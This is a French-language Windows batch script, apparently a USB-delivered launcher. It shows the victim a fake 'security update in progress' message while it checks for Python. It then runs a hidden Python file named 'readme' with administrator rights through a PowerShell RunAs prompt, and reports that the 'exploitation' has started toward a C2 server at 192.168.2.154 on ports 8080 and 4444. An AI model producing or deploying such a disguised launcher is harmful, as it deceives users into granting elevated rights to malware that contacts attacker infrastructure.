@echo off
echo *** Mise a jour de securite en cours. Ne retirez pas la cle USB. ***
cd /d %~dp0
echo Verification des pre-requis...

:: Verifie si Python est installe
where python >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo Erreur critique : Python n'est pas installe. Telechargez-le a https://www.python.org/downloads/ et ajoutez-le au PATH.
    pause
    exit /b
) else (
    echo Python trouve, continuons...
)

:: Lance l'attaque avec privil√®ges admin
echo Tentative d'execution avec droits administrateurs...
powershell -Command "Start-Process python -Verb RunAs -ArgumentList 'readme' -WorkingDirectory '%CD%' -NoNewWindow -Wait"
if %ERRORLEVEL% neq 0 (
    echo Echec de l'execution admin. Details : %ERRORLEVEL%
    pause
) else (
    echo Exploitation lancee avec succes. Verifiez le serveur C2 (192.168.2.154:8080 et 4444).
)

:: Attente pour simulation
timeout /t 15
echo Mise a jour terminee. Vous pouvez retirer la cle.
pause
